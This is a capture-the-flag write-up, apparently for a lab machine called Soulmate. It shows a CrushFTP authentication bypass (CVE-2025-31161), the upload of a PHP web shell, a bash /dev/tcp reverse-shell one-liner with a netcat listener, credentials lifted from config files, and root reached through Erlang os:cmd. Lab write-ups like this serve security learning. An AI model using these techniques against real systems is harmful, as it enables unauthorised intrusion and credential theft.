
I am given an IP address for a Linux machine
First things first, I start with a nmap scan for port enumeration
![[Pasted image 20250923115608.png]]
- 2 ports are open:
	- `22` - for `ssh`
	- `80` - for http meaning there is a webapp present there

The port `80` holds a web app named `Soulmate` which is an application used by singles to find their love, like Tinder
![[Pasted image 20250923120233.png]]

- The web app has 3 pages:
	- the main page
	- `register.php` page
	- `login.php` page 

- I visit the `register.php` page and I complete the form to create a new account
![[Pasted image 20250923120804.png]]
- After I press the Create Account button I am redirected to the login page and I use the newly created account to login
![[Pasted image 20250923120935.png]]

- After login I am redirected to the `profile.php` page where I am shown the info about my account
![[Pasted image 20250923121243.png]]

After that I wandered through the app but with no luck as I found nothing so next I decided to do some fuzzing for hidden directories, files, domains and vhosts

- Fuzzing for directories and files gave me nothing
- Fuzzing for domains gave me nothing 

Fuzzing for vhosts gave me a positive result the `ftp.soulmate.htb` vhost 
![[Pasted image 20250923121957.png]]

Now after I add the vhost in `/etc/hosts` I visit it and I am met with a `CrushFTP` login page
![[Pasted image 20250923122350.png]]

- Because the first thing I see is the login page I use `burpsuite` to check the response to see what it hides behind
- Looking through the response I found the version of `CrushFTP` inside a script reference, which is `11.W.657 Build 8-March-2025`
![[Pasted image 20250923122941.png]]

- A quick search on google for vulnerabilities for this version revealed the vulnerability [CVE-2025-31161](https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation) which is an Authentication Bypass vulnerability, perfect for this case
- Moreover I found a PoC for this vulnerability found in this repo https://github.com/Immersive-Labs-Sec/CVE-2025-31161
- The PoC creates a new user account with administrative privileges
![[Pasted image 20250923124233.png]]

- Login in with the newly created account I was given access to the dashboard
![[Pasted image 20250923124416.png]]

- Next I go to the `Admin` tab 
![[Pasted image 20250923124450.png]]
- Then I visit the `UserManager` in the `Admin` tab, to check the present users 
![[Pasted image 20250923124516.png]]

- Now that I got access to the User panel I have access to all users(`ben`, `jenna`, `crushadmin`, etc.) and also some of their files 
![[Pasted image 20250923124543.png]]
- I can also change their passwords so I can get access to their accounts 

- The user `ben` seems to be the most interesting between them, because going through his files I found some `.php` files in the `/webProd` directory which led me thinks it is another web app
- To gain access to the `ben` account, I change its password and then I login in his account
![[Pasted image 20250923125454.png]]

- I got access as the `ben` user and also to his files
![[Pasted image 20250923125614.png]]
- Inside the `index.php` I found a surprise which is the fact that these files are the web pages for the `Soulmate` app 
![[Pasted image 20250923125745.png]]

- Next thing is to try to use these files in may advantage
- I can also see that I can upload files so I search for a quick php exploit which will give me a reverse shell to gain access to the user running the app
- I upload the `shel.php` exploit which gives me a shell
![[Pasted image 20250923131006.png]]

- Now I visit the `http://soulmate.htb/shel.php` page and the shell is present
- I use the `id` command to check its functionality and I got as a response the `www-data` user
![[Pasted image 20250923131414.png]]
- Now that the shell is working I use a quick one liner to get a reverse shell on port `4444`, and in the meantime I open a listener on that port with `nc -lvnp 4444`
```shell
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'
```
- The process was successful and I have the reverse shell as the `www-data` user
![[Pasted image 20250923131737.png]]

- Now that I got access I wanted to check the `/home` directory to see what is the next user I have try gaining access to, and that being the `ben` user
![[Pasted image 20250923131932.png]]

- Now going back to the `/soulmate.htb/public` directory I see that there are present only the files for the `soulmate.htb` app 
- But going in the parent directory `/soulmate.htb` there are more directories, one being named `/config`
- The `/config` directory holds a `config.php` file
![[Pasted image 20250923132347.png]]
- Going through the `config.php` file I found a password for an Administrator account 
![[Pasted image 20250923132432.png]]
- The password is `Crush4dmin990` 
- Because people in this world often use the same password for multiple accounts, I want to check if I can `ssh` into ben account using this password but I got no luck

After some more failed tries I decide to run the command `ps aux` to see all processes that are currently running and one in particular got my attention
![[Pasted image 20250923133016.png]]
- The process is an `Erlang SSH service` which allow connection on the server'
- I check the `/usr/local/lib/erlang_login/start.escript` file to check its content and voila there is a goldmine hiding here
![[Pasted image 20250923133329.png]]
- First I am given the credentials for the user `ben` account:
	- user: `ben`
	- password: `HouseH0ldings998`
- Second the `Erlang SSH service` runs on port `2222`

- Having the credentials for the user `ben` I log in using `ssh`, now with success, and I output the flag from the `user.txt` file
![[Pasted image 20250923133702.png]]

## Root privilege escalation

Now that I finished with `ben` I have to find a way to gain access to the root user

- Because earlier I found that there is a `Erlang SSH service` running on port `2222`, I wanted to confirm that by using `ss -tulnp` command:
```shell
ben@soulmate:~$ ss -tulnp
Netid     State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port     Process     
udp       UNCONN      0           0                127.0.0.53%lo:53                   0.0.0.0:*                    
tcp       LISTEN      0           128                  127.0.0.1:41277                0.0.0.0:*                    
tcp       LISTEN      0           4096                 127.0.0.1:4369                 0.0.0.0:*                    
tcp       LISTEN      0           5                    127.0.0.1:2222                 0.0.0.0:* 
```
- The service is running so I decide to connect to it using the following command:
```shell
ssh ben@localhost -p 2222
```
![[Pasted image 20250923134135.png]]
- Next, I research about Erlang security on the almighty Google and from this article https://vuln.be/post/os-command-and-code-execution-in-erlang-and-elixir/ I found that I can run OS commands by using `os:cmd("<command>").`

- To check if I can run commands I use the `id` command to see if the Erlang shell works and what permissions I have when running these commands
```shell
(ssh_runner@soulmate)2> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```
- The output is very delightful, because I can run commands as the `root` user which means I got access to the whole system

- Now that I got access to the `root` user I type the `os:cmd("cat /root/root.txt").` command and I get the system flag as an output
![[Pasted image 20250923135045.png]]